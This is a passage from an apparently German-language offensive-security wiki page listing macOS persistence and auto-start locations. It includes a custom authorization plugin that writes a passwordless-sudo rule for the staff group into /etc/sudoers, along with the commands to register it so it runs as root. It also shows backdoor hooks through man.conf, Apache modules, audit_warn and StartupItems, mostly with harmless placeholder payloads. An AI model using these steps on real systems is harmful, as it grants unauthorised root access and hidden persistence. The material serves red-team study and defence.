// mv CustomAuth CustomAuth.bundle/Contents/MacOS/

#import <Foundation/Foundation.h>

__attribute__((constructor)) static void run()
{
NSLog(@"%@", @"[+] Custom Authorization Plugin was loaded");
system("echo \"%staff ALL=(ALL) NOPASSWD:ALL\" >> /etc/sudoers");
}
```
**Verschieben** Sie das Bundle an den Ort, an dem es geladen werden soll:
```bash
cp -r CustomAuth.bundle /Library/Security/SecurityAgentPlugins/
```
Fügen Sie schließlich die **Regel** hinzu, um dieses Plugin zu laden:
```bash
cat > /tmp/rule.plist <<EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>class</key>
<string>evaluate-mechanisms</string>
<key>mechanisms</key>
<array>
<string>CustomAuth:login,privileged</string>
</array>
</dict>
</plist>
EOF

security authorizationdb write com.asdf.asdf < /tmp/rule.plist
```
Die **`evaluate-mechanisms`** wird dem Autorisierungsrahmen mitteilen, dass er **einen externen Mechanismus zur Autorisierung aufrufen** muss. Darüber hinaus wird **`privileged`** bewirken, dass es von root ausgeführt wird.

Triggern Sie es mit:
```bash
security authorize com.asdf.asdf
```
Und dann sollte die **Staff-Gruppe sudo**-Zugriff haben (lesen Sie `/etc/sudoers`, um dies zu bestätigen).

### Man.conf

Schreibweise: [https://theevilbit.github.io/beyond/beyond_0030/](https://theevilbit.github.io/beyond/beyond_0030/)

- Nützlich, um die Sandbox zu umgehen: [🟠](https://emojipedia.org/large-orange-circle)
- Aber Sie müssen root sein und der Benutzer muss man verwenden
- TCC-Umgehung: [🔴](https://emojipedia.org/large-red-circle)

#### Standort

- **`/private/etc/man.conf`**
- Root erforderlich
- **`/private/etc/man.conf`**: Wann immer man verwendet wird

#### Beschreibung & Exploit

Die Konfigurationsdatei **`/private/etc/man.conf`** gibt das Binary/Skript an, das verwendet werden soll, wenn man-Dokumentationsdateien geöffnet werden. Der Pfad zur ausführbaren Datei könnte so geändert werden, dass jedes Mal, wenn der Benutzer man verwendet, um einige Dokumente zu lesen, ein Backdoor ausgeführt wird.

Zum Beispiel in **`/private/etc/man.conf`** festgelegt:
```
MANPAGER /tmp/view
```
Und erstellen Sie dann `/tmp/view` als:
```bash
#!/bin/zsh

touch /tmp/manconf

/usr/bin/less -s
```
### Apache2

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0023/](https://theevilbit.github.io/beyond/beyond_0023/)

- Nützlich, um die Sandbox zu umgehen: [🟠](https://emojipedia.org/large-orange-circle)
- Aber du musst root sein und Apache muss laufen
- TCC-Umgehung: [🔴](https://emojipedia.org/large-red-circle)
- Httpd hat keine Berechtigungen

#### Standort

- **`/etc/apache2/httpd.conf`**
- Root erforderlich
- Auslöser: Wenn Apache2 gestartet wird

#### Beschreibung & Exploit

Du kannst in `/etc/apache2/httpd.conf` angeben, ein Modul zu laden, indem du eine Zeile wie folgt hinzufügst:
```bash
LoadModule my_custom_module /Users/Shared/example.dylib "My Signature Authority"
```
Auf diese Weise wird Ihr kompiliertes Modul von Apache geladen. Das Einzige ist, dass Sie es entweder **mit einem gültigen Apple-Zertifikat signieren** müssen oder **ein neues vertrauenswürdiges Zertifikat** im System hinzufügen und **es damit signieren** müssen.

Dann, falls erforderlich, um sicherzustellen, dass der Server gestartet wird, könnten Sie ausführen:
```bash
sudo launchctl load -w /System/Library/LaunchDaemons/org.apache.httpd.plist
```
Codebeispiel für das Dylb:
```objectivec
#include <stdio.h>
#include <syslog.h>

__attribute__((constructor))
static void myconstructor(int argc, const char **argv)
{
printf("[+] dylib constructor called from %s\n", argv[0]);
syslog(LOG_ERR, "[+] dylib constructor called from %s\n", argv[0]);
}
```
### BSM-Audit-Framework

Writeup: [https://theevilbit.github.io/beyond/beyond_0031/](https://theevilbit.github.io/beyond/beyond_0031/)

- Nützlich, um die Sandbox zu umgehen: [🟠](https://emojipedia.org/large-orange-circle)
- Aber du musst root sein, auditd muss laufen und eine Warnung auslösen
- TCC-Umgehung: [🔴](https://emojipedia.org/large-red-circle)

#### Standort

- **`/etc/security/audit_warn`**
- Root erforderlich
- **Auslöser**: Wenn auditd eine Warnung erkennt

#### Beschreibung & Exploit

Wann immer auditd eine Warnung erkennt, wird das Skript **`/etc/security/audit_warn`** **ausgeführt**. Du könntest also deinen Payload dort hinzufügen.
```bash
echo "touch /tmp/auditd_warn" >> /etc/security/audit_warn
```
Sie könnten eine Warnung mit `sudo audit -n` erzwingen.

### Startup Items

> [!CAUTION] > **Dies ist veraltet, daher sollte in diesen Verzeichnissen nichts gefunden werden.**

Der **StartupItem** ist ein Verzeichnis, das entweder innerhalb von `/Library/StartupItems/` oder `/System/Library/StartupItems/` positioniert sein sollte. Sobald dieses Verzeichnis eingerichtet ist, muss es zwei spezifische Dateien enthalten:

1. Ein **rc-Skript**: Ein Shell-Skript, das beim Start ausgeführt wird.
2. Eine **plist-Datei**, die speziell `StartupParameters.plist` genannt wird und verschiedene Konfigurationseinstellungen enthält.

Stellen Sie sicher, dass sowohl das rc-Skript als auch die `StartupParameters.plist`-Datei korrekt im **StartupItem**-Verzeichnis platziert sind, damit der Startprozess sie erkennen und nutzen kann.

{{#tabs}}
{{#tab name="StartupParameters.plist"}}
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Description</key>
<string>This is a description of this service</string>
<key>OrderPreference</key>
<string>None</string> <!--Other req services to execute before this -->
<key>Provides</key>
<array>
<string>superservicename</string> <!--Name of the services provided by this file -->
</array>
</dict>
</plist>
```
{{#endtab}}

{{#tab name="superservicename"}}
```bash
#!/bin/sh
. /etc/rc.common

StartService(){
touch /tmp/superservicestarted
}

StopService(){
rm /tmp/superservicestarted
}

RestartService(){
echo "Restarting"
}

RunService "$1"
```
{{#endtab}}
{{#endtabs}}

### ~~emond~~

> [!CAUTION]
> Ich kann diese Komponente in meinem macOS nicht finden, also für weitere Informationen die Beschreibung überprüfen

Beschreibung: [https://theevilbit.github.io/beyond/beyond_0023/](https://theevilbit.github.io/beyond/beyond_0023/)

Einführung durch Apple, **emond** ist ein Protokollierungsmechanismus, der anscheinend unterentwickelt oder möglicherweise aufgegeben wurde, aber dennoch zugänglich bleibt. Während es für einen Mac-Administrator nicht besonders vorteilhaft ist, könnte dieser obskure Dienst als subtile Persistenzmethode für Bedrohungsakteure dienen, die wahrscheinlich von den meisten macOS-Administratoren unbemerkt bleibt.

Für diejenigen, die sich seiner Existenz bewusst sind, ist die Identifizierung jeglicher böswilliger Nutzung von **emond** unkompliziert. Der LaunchDaemon des Systems für diesen Dienst sucht nach Skripten, die in einem einzigen Verzeichnis ausgeführt werden sollen. Um dies zu überprüfen, kann der folgende Befehl verwendet werden:
```bash
ls -l /private/var/db/emondClients
```
### ~~XQuartz~~

Writeup: [https://theevilbit.github.io/beyond/beyond_0018/](https://theevilbit.github.io/beyond/beyond_0018/)

#### Standort

- **`/opt/X11/etc/X11/xinit/privileged_startx.d`**
- Root erforderlich
- **Auslöser**: Mit XQuartz

#### Beschreibung & Exploit

XQuartz ist **nicht mehr in macOS installiert**, also wenn Sie mehr Informationen möchten, überprüfen Sie den Writeup.

### ~~kext~~

> [!CAUTION]
> Es ist so kompliziert, kext selbst als Root zu installieren, dass ich dies nicht in Betracht ziehen werde, um aus Sandkästen zu entkommen oder sogar für Persistenz (es sei denn, Sie haben einen Exploit)

#### Standort

Um ein KEXT als Startobjekt zu installieren, muss es **in einem der folgenden Standorte installiert werden**:

- `/System/Library/Extensions`
- KEXT-Dateien, die in das OS X-Betriebssystem integriert sind.
- `/Library/Extensions`
- KEXT-Dateien, die von Drittanbieter-Software installiert wurden

Sie können derzeit geladene kext-Dateien mit auflisten:
```bash
kextstat #List loaded kext
kextload /path/to/kext.kext #Load a new one based on path
kextload -b com.apple.driver.ExampleBundle #Load a new one based on path
kextunload /path/to/kext.kext
kextunload -b com.apple.driver.ExampleBundle
```
Für weitere Informationen über [**Kernel-Erweiterungen überprüfen Sie diesen Abschnitt**](macos-security-and-privilege-escalation/mac-os-architecture/#i-o-kit-drivers).

### ~~amstoold~~

Schriftliche Ausarbeitung: [https://theevilbit.github.io/beyond/beyond_0029/](https://theevilbit.github.io/beyond/beyond_0029/)

#### Standort

- **`/usr/local/bin/amstoold`**
- Root erforderlich

#### Beschreibung & Ausnutzung

Offensichtlich verwendete die `plist` von `/System/Library/LaunchAgents/com.apple.amstoold.plist` dieses Binary, während ein XPC-Dienst exponiert wurde... das Problem ist, dass das Binary nicht existierte, sodass Sie dort etwas platzieren konnten und wenn der XPC-Dienst aufgerufen wird, wird Ihr Binary aufgerufen.

Ich kann dies in meinem macOS nicht mehr finden.

### ~~xsanctl~~

Schriftliche Ausarbeitung: [https://theevilbit.github.io/beyond/beyond_0015/](https://theevilbit.github.io/beyond/beyond_0015/)

#### Standort

- **`/Library/Preferences/Xsan/.xsanrc`**
- Root erforderlich
- **Auslöser**: Wenn der Dienst ausgeführt wird (selten)

#### Beschreibung & Ausnutzung

Offensichtlich ist es nicht sehr verbreitet, dieses Skript auszuführen, und ich konnte es nicht einmal in meinem macOS finden, also wenn Sie mehr Informationen möchten, überprüfen Sie die schriftliche Ausarbeitung.

### ~~/etc/rc.common~~

> [!CAUTION] > **Dies funktioniert nicht in modernen macOS-Versionen**

Es ist auch möglich, hier **Befehle zu platzieren, die beim Start ausgeführt werden.** Beispiel eines regulären rc.common-Skripts:
```bash
#
# Common setup for startup scripts.
#
# Copyright 1998-2002 Apple Computer, Inc.
#

######################
# Configure the shell #
######################

#
# Be strict
#
#set -e
set -u

#
# Set command search path
#
PATH=/bin:/sbin:/usr/bin:/usr/sbin:/usr/libexec:/System/Library/CoreServices; export PATH

#
# Set the terminal mode
#
#if [ -x /usr/bin/tset ] && [ -f /usr/share/misc/termcap ]; then
#    TERM=$(tset - -Q); export TERM
#fi

###################
# Useful functions #
###################

#
# Determine if the network is up by looking for any non-loopback
# internet network interfaces.
#
CheckForNetwork()
{
local test

if [ -z "${NETWORKUP:=}" ]; then
test=$(ifconfig -a inet 2>/dev/null | sed -n -e '/127.0.0.1/d' -e '/0.0.0.0/d' -e '/inet/p' | wc -l)
if [ "${test}" -gt 0 ]; then
NETWORKUP="-YES-"
else
NETWORKUP="-NO-"
fi
fi
}

alias ConsoleMessage=echo

#
# Process management
#
GetPID ()
{
local program="$1"
local pidfile="${PIDFILE:=/var/run/${program}.pid}"
local     pid=""

if [ -f "${pidfile}" ]; then
pid=$(head -1 "${pidfile}")
if ! kill -0 "${pid}" 2> /dev/null; then
echo "Bad pid file $pidfile; deleting."
pid=""
rm -f "${pidfile}"
fi
fi

if [ -n "${pid}" ]; then
echo "${pid}"
return 0
else
return 1
fi
}

#
# Generic action handler
#
RunService ()
{
case $1 in
start  ) StartService   ;;
stop   ) StopService    ;;
restart) RestartService ;;
*      ) echo "$0: unknown argument: $1";;
esac
}
```
## Persistenztechniken und -werkzeuge

- [https://github.com/cedowens/Persistent-Swift](https://github.com/cedowens/Persistent-Swift)
- [https://github.com/D00MFist/PersistentJXA](https://github.com/D00MFist/PersistentJXA)

{{#include ../banners/hacktricks-training.md}}
